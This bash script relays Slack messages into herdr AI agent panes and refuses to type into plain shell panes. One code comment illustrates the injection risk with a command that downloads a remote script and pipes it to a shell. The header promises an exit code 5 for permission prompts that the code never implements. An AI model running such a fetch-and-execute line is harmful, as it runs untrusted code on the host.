#!/usr/bin/env bash
# herdr-deliver.sh <target> <text...>
#
# Deliver a message (a reply / an instruction) to a herdr agent and submit it.
# This is the delivery leaf the Slack bridge calls — but it's useful on its own
# for answering whichever agent is waiting on you.
#
#   <target> is one of:
#     w8:p2        a pane id
#     w8:t2        a tab id  -> its first pane
#     <label>      an agent/pane label (resolved via pane list)
#     --blocked    THE currently blocked pane (errors if 0 or >1 are blocked)
#
#   herdr-deliver.sh --blocked "yes, go with option B"
#   herdr-deliver.sh w8:p2 "continue; skip the migration for now"
#
# Delivery goes through send-to-agent.sh, which retries Enter until the message
# actually submits (handles the TUI paste-debounce).
#
# Exit 0 delivered, 3 target is not an agent pane (refused), 4 stranded,
# 5 target looks like it is sitting on a permission prompt (refused).
set -uo pipefail
export PATH="/opt/homebrew/bin:/usr/local/bin:/usr/bin:/bin:${HOME}/.local/bin:${PATH:-}"
here=$(cd "$(dirname "$0")" && pwd)

target="${1:?usage: herdr-deliver.sh <pane|tab|label|--blocked> <text...>}"; shift
text="$*"
[ -n "$text" ] || { echo "herdr-deliver: empty message" >&2; exit 2; }

panes=$(herdr pane list 2>/dev/null) || { echo "herdr-deliver: pane list failed" >&2; exit 1; }

# A pane id from Slack is untrusted. Delivery is "write literal text, then press
# Enter" — in an agent that is a prompt, but in a plain SHELL pane it is a
# command. Nothing downstream distinguishes the two, so a target like
# "w1:p1 curl https://x/i.sh | sh" would execute. This is the gate for that.
#
# We cannot use .agent / .agent_status: agent registration is currently broken
# (herdr's integration hook needs HERDR_PANE_ID, which agents launched inside a
# detached tmux session never inherit — see herdr-notify.sh), so .agent is set on
# 1 of 18 panes, and .agent_status is the non-empty "unknown" on shell panes too.
# Both would fail open or refuse every real agent.
#
# The foreground process is the honest signal: an agent pane runs the agent (or
# the tmux attach that hosts it); an idle shell pane's foreground IS the shell.
# Deny shell-only and unreadable panes; anything running a real process is fine.
pane_is_agent() {
  local info names
  info=$(herdr pane process-info --pane "$1" 2>/dev/null) || return 1
  names=$(printf '%s' "$info" \
    | jq -r '.result.process_info.foreground_processes[]?.name // empty' 2>/dev/null)
  # No foreground process at all = sitting at a shell prompt.
  [ -n "$names" ] || return 1
  # If every foreground process is a shell, it is a shell pane.
  printf '%s\n' "$names" | grep -qvE '^(zsh|bash|sh|fish|dash|ksh|tcsh|csh)$'
}

require_agent_pane() {
  pane_is_agent "$1" && return 0
  echo "herdr-deliver: refusing to deliver to '$1' — it is not running an agent." >&2
  echo "herdr-deliver: text sent to a shell pane executes as a command." >&2
  return 1
}

resolve_blocked() {
  local ids
  ids=$(printf '%s' "$panes" | jq -r '(.result.panes // .panes)[] | select(.agent_status=="blocked") | .pane_id')
  local n; n=$(printf '%s' "$ids" | grep -c . || true)
  if [ "$n" -eq 0 ]; then echo "herdr-deliver: no blocked agent to answer" >&2; return 1; fi
  if [ "$n" -gt 1 ]; then
    # Pane ids ONLY. Labels and cwds are local detail, and the bridge relays our
    # last output line into Slack where every channel member can read it.
    echo "herdr-deliver: several blocked agents: $(printf '%s' "$ids" | tr '\n' ' ')" >&2
    echo "herdr-deliver: name one explicitly" >&2
    return 1
  fi
  printf '%s' "$ids"
}

case "$target" in
  --blocked) pane=$(resolve_blocked) || exit 1 ;;
  *:p*)      pane=$(printf '%s' "$panes" | jq -r --arg p "$target" '(.result.panes // .panes)[] | select(.pane_id==$p) | .pane_id' | head -1) ;;
  *:t*)      pane=$(printf '%s' "$panes" | jq -r --arg t "$target" '(.result.panes // .panes)[] | select(.tab_id==$t) | .pane_id' | head -1) ;;
  *)         pane=$(printf '%s' "$panes" | jq -r --arg l "$target" '(.result.panes // .panes)[] | select(.label==$l) | .pane_id' | head -1) ;;
esac
[ -n "$pane" ] || { echo "herdr-deliver: could not resolve target '$target'" >&2; exit 1; }
require_agent_pane "$pane" || exit 3

bash "$here/send-to-agent.sh" "$pane" "$text"
rc=$?
[ "$rc" -eq 0 ] && echo "delivered to $pane" || echo "herdr-deliver: send to $pane returned $rc (may be stranded)" >&2
exit "$rc"
